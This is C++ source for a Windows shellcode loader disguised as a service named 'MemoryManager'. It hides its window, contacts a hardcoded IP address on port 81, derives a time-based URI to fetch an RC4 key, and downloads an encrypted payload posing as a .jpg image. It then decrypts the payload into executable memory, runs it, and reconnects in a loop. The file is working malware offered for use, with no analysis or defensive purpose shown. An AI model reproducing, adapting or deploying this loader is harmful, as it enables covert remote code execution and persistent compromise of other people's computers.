#include <windows.h>  
#include <string>
#include "b64/base64.h"
//#include <string.h>

#include "EsyGet/HttpRequest.h"
#include "Md5/md5.h"
#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"

//data段可读写  
//#pragma comment(linker, "/section:.data,RWE")   
//不显示窗口  
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
#pragma comment(linker, "/INCREMENTAL:NO")
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);

const char target[] = "192.3.176.232";
const int  port = 81;
const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
typedef void(__stdcall *CODE) ();
char * shellcode = NULL;
int shellcode_size = 0; 

typedef PVOID (*M) (DWORD, DWORD, DWORD, DWORD);

std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return MD5(u).toStr();
}
void GetShellCodeSize()
{
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/my/get_size");
	std::string body = httpReq.getBody(res);
	shellcode_size = std::atoi(body.c_str());
	
	shellcode = (char *)malloc(shellcode_size);
	
}
std::string GetKey()
{
	GetShellCodeSize();
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/"+ GenerateUri());

	std::string body = httpReq.getBody(res);
	return body;
}
void LoadShellCode(char *shellcode)
{
	HMODULE hDllLib = LoadLibrary("Kernel32.dll");
	FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
	M VirtualAlloc_ = (M)*fpFun;
	PVOID p = NULL;
	p = VirtualAlloc_(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
	
	CODE code = (CODE)p;
	code();
	
}

void DecPayload(std::string key)
{
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	time_t myt = time(NULL);
	int filename = int(int(myt) / 100);

	std::string res = httpReq.HttpGet("/"+ std::to_string(filename)+".jpg");
	std::string body = httpReq.getBody(res);
	std::string payload = base64_decode(body);
	char * c_payload = (char *)malloc(shellcode_size);
	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
	ARC4 rc4;
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, shellcode_size);

	LoadShellCode(shellcode);
	
}





SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
std::string ServiceName = "MemoryManager";
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
	if (!(ServiceStatusHandle = RegisterServiceCtrlHandler(ServiceName.c_str(),
		BDHandler))) return;
	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP
		| SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
	while (TRUE){
		DecPayload(GetKey());
		Sleep(50000);// 如果掉线，过一分钟自动重连
	}
	
}


void WINAPI BDHandler(DWORD dwControl)
{
	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	default:
		break;
	}
}

int main()
{  
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = (char *)ServiceName.c_str();
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;
	StartServiceCtrlDispatcher(ServiceTable);
	Sleep(20000);
	//如果要不安装服务运行，请直接DecPayload(GetKey());
	//ServiceInstall();
	DecPayload(GetKey());
	
    return 0;  
}  